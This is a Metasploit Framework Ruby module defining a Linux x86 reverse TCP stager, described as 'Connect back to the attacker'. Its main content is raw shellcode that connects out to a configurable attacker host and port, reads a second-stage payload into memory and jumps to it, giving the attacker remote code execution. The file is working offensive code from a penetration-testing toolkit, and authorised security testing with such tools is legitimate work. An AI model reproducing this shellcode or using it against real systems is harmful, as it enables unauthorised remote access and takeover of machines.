##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module Msf
module Payloads
module Stagers
module Linux
module X86

###
#
# ReverseTcp
# ----------
#
# Linux reverse TCP stager.
#
###
module ReverseTcp

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Reverse TCP Stager',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to the attacker',
			'Author'        => 'skape',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        =>
				{
					'Offsets' =>
						{
							'LHOST' => [ 0x11, 'ADDR' ],
							'LPORT' => [ 0x17, 'n'    ],
						},
					'Payload' =>
						"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x97\x5b" +
						"\x68\x7f\x00\x00\x01\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58" +
						"\x50\x51\x57\x89\xe1\x43\xcd\x80\x5b\x99\xb6\x0c\xb0\x03\xcd\x80" +
						"\xff\xe1"
				}
			))
	end

end

end end end end end
